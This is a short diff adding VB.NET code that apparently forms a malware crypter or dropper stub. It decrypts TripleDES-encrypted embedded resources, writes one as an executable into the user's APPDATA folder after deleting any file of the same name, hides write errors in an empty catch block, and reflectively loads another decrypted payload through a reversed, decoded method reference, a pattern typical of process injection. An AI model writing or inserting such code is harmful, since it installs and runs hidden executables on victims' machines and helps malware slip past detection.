@@ -1,0 +1,14 @@
+ Dim N As String = TripleDESdecrypt(R.GetObject("NM"),R.GetObject("K"), True)
+ Dim I As String = Environ("APPDATA") & "\" & N & ".exe"
+ If IO.File.Exists(I) Then
+	IO.File.Delete(I)
+ End If
+ Dim II As Byte() = System.Text.Encoding.Default.GetBytes(TripleDESdecrypt(R.GetObject("I"), _
+ R.GetObject("K"), True))
+ Try
+	My.Computer.FileSystem.WriteAllBytes(I, II, False)
+ Catch
+ End Try
+ Dim III As Byte() = System.Text.Encoding.Default.GetBytes(TripleDESdecrypt(R.GetObject("F"), _
+ R.GetObject("K"), True))
+ LoadMethod("IX", "R", CC(ReverseString(R.GetObject("X"))), New Object() {III, I})
